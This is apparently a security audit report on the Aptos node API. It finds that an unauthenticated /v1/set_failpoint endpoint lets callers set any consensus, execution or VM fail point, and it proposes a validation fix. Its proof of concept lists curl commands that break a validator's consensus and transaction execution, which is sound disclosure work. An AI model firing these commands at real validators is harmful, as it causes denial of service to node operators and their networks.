# Audit Report

## Title
Unauthenticated Fail Point Configuration Endpoint Enables Targeted Denial-of-Service Against Consensus and Execution Systems

## Summary
The `/v1/set_failpoint` API endpoint accepts arbitrary fail point names without validation or authentication, allowing attackers to manipulate critical consensus, execution, and networking fail points on nodes with `failpoints_enabled: true`. This enables targeted denial-of-service attacks against validators running in testnet/devnet environments or misconfigured production nodes.

## Finding Description

The API exposes a fail point configuration endpoint that lacks proper input validation and access controls, violating the principle of least privilege.

**Root Cause:**
The `set_failpoint_poem` function directly passes user-supplied fail point names to the global fail point registry without any filtering: [1](#0-0) 

While the `fail_point_poem` helper used in API endpoints adds an "api::" prefix for scoping: [2](#0-1) 

The configuration endpoint bypasses this scoping entirely, allowing manipulation of ANY fail point in the codebase. The endpoint is exposed without authentication: [3](#0-2) 

**Attack Vectors:**

1. **Consensus Network Disruption** - An attacker can set the `consensus::send::any` fail point to prevent block retrieval and consensus messaging: [4](#0-3) 

2. **VM Execution Failures** - Setting `aptos_vm::vm_wrapper::execute_transaction` causes transaction execution to fail with invariant errors: [5](#0-4) 

3. **Block Execution Prevention** - The `executor::block_executor_execute_block` fail point blocks all block processing: [6](#0-5) 

4. **Consensus Proposal Processing Failures** - Setting `consensus::process_proposal_msg` prevents proposal handling: [7](#0-6) 

**Exploitation Path:**
```
1. Attacker identifies a validator node with failpoints_enabled: true (testnet/devnet)
2. Attacker sends: GET /v1/set_failpoint?name=consensus::send::any&actions=return
3. The fail point is configured globally without validation
4. All subsequent consensus network operations fail
5. The validator becomes unable to participate in consensus
6. Network experiences liveness degradation or targeted validator exclusion
```

**Evidence from Test Suite:**
The test suite confirms this functionality, setting non-API fail points via the public endpoint: [8](#0-7) [9](#0-8) 

## Impact Explanation

**Severity: Medium to High**

While mainnet is protected by configuration validation that prevents `failpoints_enabled` on production networks: [10](#0-9) 

The vulnerability still poses significant risks:

1. **Testnet/Devnet Attack Surface**: Development and staging validators running with failpoints enabled for testing are fully vulnerable to targeted DOS attacks
2. **Consensus Liveness Violations**: Attackers can prevent specific validators from participating in consensus, potentially causing liveness failures if enough validators are targeted
3. **State Divergence Risk**: Selective manipulation of VM execution fail points could theoretically cause different validators to produce different execution results
4. **No Authentication Required**: The endpoint is publicly accessible without any authentication mechanism

**Impact Classification**: **Medium Severity** per Aptos bug bounty criteria - causes validator node slowdowns and significant protocol disruptions, though not on mainnet.

## Likelihood Explanation

**Likelihood: Medium**

**Attack Prerequisites:**
1. Target node must have `failpoints_enabled: true` in configuration
2. Attacker must have network access to the node's API endpoint
3. No authentication or special privileges required

**Realistic Scenarios:**
- Testnet validators used for pre-production testing
- Development environments exposed to untrusted networks
- Staging deployments with debug features enabled
- Misconfigured nodes (though mainnet validation should prevent this)

The likelihood is moderate because while mainnet is protected, the extensive use of testnet/devnet for development means vulnerable nodes exist in the ecosystem. The lack of authentication makes exploitation trivial once a vulnerable node is identified.

## Recommendation

**Immediate Fix: Implement Input Validation and Scoping**

1. **Restrict fail point names to API scope only**:
```rust
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        // VALIDATION: Only allow API-scoped fail points
        if !failpoint_conf.name.starts_with("api::") {
            return Err(poem::Error::from(anyhow::anyhow!(
                "Fail point configuration is restricted to API scope only. Name must start with 'api::'"
            )));
        }
        
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

2. **Add Authentication**: Implement bearer token or IP whitelist authentication for the endpoint

3. **Rate Limiting**: Add rate limits to prevent rapid configuration changes

4. **Audit Logging**: Log all fail point configuration attempts with source IP and timestamp

## Proof of Concept

**Test Setup:**
```bash
# Start a local node with failpoints enabled in config
# In node config YAML:
api:
  failpoints_enabled: true
```

**Attack Execution:**
```bash
# Step 1: Configure consensus fail point to block all network sends
curl "http://validator-node:8080/v1/set_failpoint?name=consensus::send::any&actions=return"
# Response: "Set failpoint consensus::send::any"

# Step 2: Observe consensus failures
# The validator will now fail to send any consensus messages
# Check logs for: "Injected error in request_block"

# Step 3: Configure VM execution fail point
curl "http://validator-node:8080/v1/set_failpoint?name=aptos_vm::vm_wrapper::execute_transaction&actions=return"
# Response: "Set failpoint aptos_vm::vm_wrapper::execute_transaction"

# Step 4: Observe transaction execution failures
# All transactions will now fail with DelayedFieldsCodeInvariantError

# Step 5: Disable fail points (for cleanup)
curl "http://validator-node:8080/v1/set_failpoint?name=consensus::send::any&actions=off"
curl "http://validator-node:8080/v1/set_failpoint?name=aptos_vm::vm_wrapper::execute_transaction&actions=off"
```

**Rust Integration Test:**
```rust
#[tokio::test]
async fn test_failpoint_scope_violation() {
    let swarm = SwarmBuilder::new_local(1)
        .with_init_config(Arc::new(|_, config, _| {
            config.api.failpoints_enabled = true;
        }))
        .build()
        .await;
    
    let client = swarm.validators().next().unwrap().rest_client();
    
    // Should be able to set API fail points
    assert!(client.set_failpoint(
        "api::endpoint_get_account".to_string(),
        "return".to_string()
    ).await.is_ok());
    
    // VULNERABILITY: Can also set consensus fail points
    assert!(client.set_failpoint(
        "consensus::process_proposal_msg".to_string(),
        "return".to_string()
    ).await.is_ok());
    
    // Consensus should now be broken
    // This should NOT be possible from the API endpoint
}
```

## Notes

- This vulnerability requires `failpoints_enabled: true` but represents a defense-in-depth failure
- The lack of scoping violates the principle of least privilege - API endpoints should not control consensus behavior
- While mainnet has configuration validation, the large testnet/devnet attack surface remains
- The fail point mechanism is designed for testing but lacks proper isolation between subsystems
- No authentication mechanism exists to restrict access even in testing environments

### Citations

**File:** api/src/set_failpoints.rs (L27-29)
```rust
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
```

**File:** api/src/failpoint.rs (L14-20)
```rust
pub fn fail_point_poem<E: InternalError>(name: &str) -> Result<(), E> {
    fail::fail_point!(format!("api::{}", name).as_str(), |_| {
        Err(E::internal_with_code_no_info(
            format!("Failpoint unexpected internal error for {}", name),
            AptosErrorCode::InternalError,
        ))
    });
```

**File:** api/src/runtime.rs (L248-251)
```rust
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** consensus/src/network.rs (L283-285)
```rust
        fail_point!("consensus::send::any", |_| {
            Err(anyhow::anyhow!("Injected error in request_block"))
        });
```

**File:** aptos-move/aptos-vm/src/block_executor/vm_wrapper.rs (L58-60)
```rust
        fail_point!("aptos_vm::vm_wrapper::execute_transaction", |_| {
            ExecutionStatus::DelayedFieldsCodeInvariantError("fail points error".into())
        });
```

**File:** execution/executor/src/block_executor/mod.rs (L236-239)
```rust
                fail_point!("executor::block_executor_execute_block", |_| {
                    Err(ExecutorError::from(anyhow::anyhow!(
                        "Injected error in block_executor_execute_block"
                    )))
```

**File:** consensus/src/round_manager.rs (L727-729)
```rust
        fail_point!("consensus::process_proposal_msg", |_| {
            Err(anyhow::anyhow!("Injected error in process_proposal_msg"))
        });
```

**File:** testsuite/smoke-test/src/execution.rs (L38-43)
```rust
        .set_failpoint(
            "aptos_vm::vm_wrapper::execute_transaction".to_string(),
            "100%return".to_string(),
        )
        .await
        .unwrap();
```

**File:** testsuite/smoke-test/src/aptos_cli/validator.rs (L120-123)
```rust
    rest_client_off
        .set_failpoint("consensus::send::any".to_string(), "100%return".to_string())
        .await
        .unwrap();
```

**File:** config/src/config/api_config.rs (L177-184)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
```
